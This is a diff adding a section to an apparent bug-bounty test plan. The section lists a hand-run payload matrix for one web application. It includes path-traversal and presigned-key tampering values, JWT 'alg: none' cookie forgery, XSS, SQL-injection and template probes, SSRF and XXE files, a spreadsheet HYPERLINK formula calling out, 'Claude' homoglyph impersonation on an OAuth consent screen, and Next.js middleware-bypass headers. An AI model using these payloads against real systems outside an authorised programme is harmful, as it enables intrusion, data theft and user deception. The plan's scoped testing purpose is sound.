@@ -2145,3 +2145,197 @@ Recorded so they are not re-tested:
 10. **AD1** Office add-in auth handoff and `postMessage` origin (24.3)
 11. **SA1-SA4** Server Action authorization sweep (20.2, 21)
 12. **MW1** inbound `x-matched-path` routing manipulation (24.5)
+
+---
+
+# 25. Curated payload matrix (not a fuzzing wordlist)
+
+**Why not a fuzzer.** Their exclusions bar "any vulnerabilities found using
+automated tooling, including automated scanners" and separately bar DoS, rate
+limiting and brute force. So fuzzer output is ineligible by rule *and* looks like
+the traffic they say they cannot triage. Cloudflare fronts every host, so volume
+also risks flagging you on a programme where you already have standing.
+
+**What works instead.** One reasoned value per hypothesis, sent by hand, with the
+response read carefully. Six values that each test a different idea beat six
+thousand that test one. Everything below is sized to be run in Repeater.
+
+**Rate discipline.** Target under roughly one request per second overall. Never
+loop. If a payload needs a second attempt, change the hypothesis, not the volume.
+
+## 25.1 `ensureFolderPaths` - prefix escape
+
+Hypothesis: paths are built from caller-supplied names (mirrored from
+Drive/SharePoint folder names, ING6) and joined into an object prefix.
+
+| Value | Tests |
+|---|---|
+| `../sibling` | plain traversal |
+| `..%2fsibling` | traversal after one decode pass |
+| `..%252fsibling` | double decode |
+| `/absolute/path` | leading-slash prefix escape |
+| `a/../../b` | normalisation applied mid-string |
+| `folder%00.txt` | null truncation |
+| `folder/./././x` | normalisation loop |
+| a 2000-char name | length handling, and whether a truncated key collides with an existing object |
+
+Read the **returned key or path**, not just the status. The finding is a path
+outside your project prefix, even if the request appears to succeed normally.
+
+## 25.2 Presigned URL actions - object key authority
+
+Hypothesis: `getPresignedUploadUrls`, `getPresignedUpdateUrl`,
+`getBackendFileUploadUrl`, `getDeliverableUploadUrl` sign a key derived from
+caller input (21.2).
+
+| Value | Tests |
+|---|---|
+| a `fileId` from **Org B** | the core cross-org check |
+| your own id, with `projectId` swapped to Org B's | mismatched-pair validation (C2) |
+| a key with `../` in it | prefix escape at signing time |
+| a key naming the **other region's** bucket | PS5 cross-bucket |
+| a key for an object that already exists | whether "update" overwrites arbitrary objects |
+| omit the project field entirely | whether it defaults to something permissive |
+
+Then inspect the **signed URL itself**: which key, which method, what expiry, and
+whether the signature covers a prefix rather than one object. A `PUT` where a
+`GET` was needed is a finding on its own.
+
+## 25.3 `lb_region` - a client-controlled routing value
+
+Hypothesis: the cookie selects a regional backend (16.2).
+
+| Value | Tests |
+|---|---|
+| `eu`, `au` | cross-region routing while authenticated to `na` |
+| `NA`, `Na` | case handling in the lookup |
+| `` (empty) | default-on-missing behaviour |
+| `na eu`, `na,eu` | parser confusion |
+| `../na`, `na/../eu` | whether it lands in a path |
+| `' OR '1'='1`, `${7*7}`, `{{7*7}}` | whether it reaches a query or template |
+| a 4000-char value | length handling |
+| `xx` (valid shape, nonexistent region) | error behaviour, and whether it discloses backend detail |
+
+The important observation is **which backend answered** - compare response
+timing, `x-vercel-id` region, and whether your own data still appears.
+
+## 25.4 Tier cookie - entitlement forgery
+
+Hypothesis: `clearUserTierCookie` implies a tier cookie, and the gate reads
+`userTier === "paid"` or `role === "admin"` (21.4, 22.1).
+
+Find the cookie first, then match the payload to its format:
+
+- plain value -> `paid`, `admin`, `enterprise`, `pro`
+- JSON -> `{"userTier":"paid"}`, and add `"role":"admin"`
+- base64 JSON -> same, re-encoded
+- JWT -> try `alg: none`, strip the signature, and an empty-key HS256 sign
+
+Then **call something paid-only** - the MCP connector endpoint with a token, or
+whatever `/upgrade` gates - because a cosmetic UI unlock is a much weaker report
+than a server-side gate that accepts the forged value.
+
+## 25.5 Object ids - `/libraries/datagaps/[id]` and friends
+
+Hypothesis: the only object route without a project segment resolves ownership
+from a bare id (RT2).
+
+First **establish the id format** from your own objects: UUIDv4, cuid, nanoid,
+ULID or sequential. That decides whether enumeration is even meaningful, and it is
+a one-glance observation rather than a fuzzing problem.
+
+| Value | Tests |
+|---|---|
+| a real id from **Org B** | the actual authorization check |
+| your id with one character altered | error differentiation: 403 vs 404 vs 500 tells you whether existence leaks |
+| a valid id of the **wrong object type** | type confusion in the lookup |
+| `1`, `0`, `-1`, `00000000-0000-0000-0000-000000000000` | sentinel handling |
+| a ULID/sequential id adjacent to yours | only if the format is ordered |
+
+**Do not iterate ids.** If the format is random, enumeration is both useless and
+indistinguishable from scanning. The cross-org read with *one* known foreign id is
+the whole finding.
+
+## 25.6 `/invite/[token]` and `/share/[token]`
+
+| Value | Tests |
+|---|---|
+| a cancelled invitation's token | revocation actually applied |
+| an expired token | server-side expiry, not just UI |
+| a consumed token, replayed | single use |
+| a valid token, accepted by a **different** account | email binding (C7) |
+| the same token after you were removed from the org | stale authorization (W7) |
+
+Token **entropy** is an observation, not a fuzzing target: collect five, compare
+length, charset and structure. If they are short or structured, say so with the
+samples; do not try to guess one.
+
+## 25.7 Document-ingestion payloads (stored XSS and parser behaviour)
+
+Hypothesis: HTML is an accepted source type (ING1) and `script-src` carries
+`'unsafe-inline'` (16.3).
+
+Upload **one** crafted file per hypothesis, then check every surface that renders
+its content: file viewer, excerpt, claim citation, search result, ontological-map
+label, generated PPTX/PDF, and MCP tool output.
+
+| File | Tests |
+|---|---|
+| `.html` with `<img src=x onerror=…>` and `<svg onload=…>` | stored XSS via the HTML source path |
+| `.html` referencing `http://<your-collab>/x.png` | SSRF on ingestion (ING3) |
+| `.eml` with a remote image and an external CSS link | SSRF in email parsing |
+| `.docx` with an XXE external entity in a document part | OOXML XXE |
+| `.xlsx` whose cell text begins `=HYPERLINK("http://<collab>")` | CSV formula injection surviving into export (INT3) |
+| a `.pptm` macro-enabled file | whether macro-enabled containers take a different path |
+| a `.vsdx` Visio file | the least-audited parser they accept |
+| filename `<img src=x onerror=alert(1)>.pdf` | filename rendering, a separate sink from content |
+
+Use an out-of-band collaborator for anything SSRF-shaped - a callback is
+unambiguous proof and needs exactly one request.
+
+## 25.8 MCP consent-screen `client_name` (LA1)
+
+At dynamic registration, vary one field:
+
+| `client_name` | Tests |
+|---|---|
+| `Claude` | plain impersonation of a trusted host |
+| `Claude ` (trailing space), `Claude`, `Сlaude` (Cyrillic С) | homoglyph and whitespace handling |
+| `<img src=x onerror=alert(1)>` | escaping on the consent page |
+| 5000 characters | layout truncation hiding the real destination |
+| `Claude\n\nApproved by LithicBlue` | newline injection into the rendered text |
+
+Register, then open your **own** authorization URL and screenshot what the consent
+screen shows. Never send one of these to anyone else.
+
+## 25.9 Request-header manipulation (MW1)
+
+Send each as a request header to `/login`, one at a time, and watch for routing or
+authorization change:
+
+```
+x-matched-path: /admin
+x-middleware-subrequest: middleware
+x-middleware-rewrite: /admin
+x-invoke-path: /admin
+x-nextjs-data: 1
+x-forwarded-host: evil.example.com
+x-forwarded-proto: http
+```
+
+Check their Next.js version against the 2025 middleware-bypass advisory **before**
+reading anything into `x-middleware-subrequest`; on a patched build it is inert.
+
+## 25.10 What not to do
+
+- No wordlist runs: no directory brute force, no parameter mining, no vhost
+  sweeps. The route oracle (24.1) already produced the real route table from about
+  seventy reasoned requests.
+- No credential work: no password spraying, no login brute force, no token
+  guessing. Explicitly excluded, and the account-lockout behaviour is documented.
+- No volume on AI endpoints. `requestScopeQuestionsGeneration` and
+  `retryFailedKAGProcessing` cost them real inference money; repeated calls read as
+  abuse, and cost amplification sits close enough to their DoS exclusion that it is
+  not worth the risk.
+- No iteration over object ids. One foreign id proves the authorization bug.
+- Nothing against real customer organisations, at any volume.
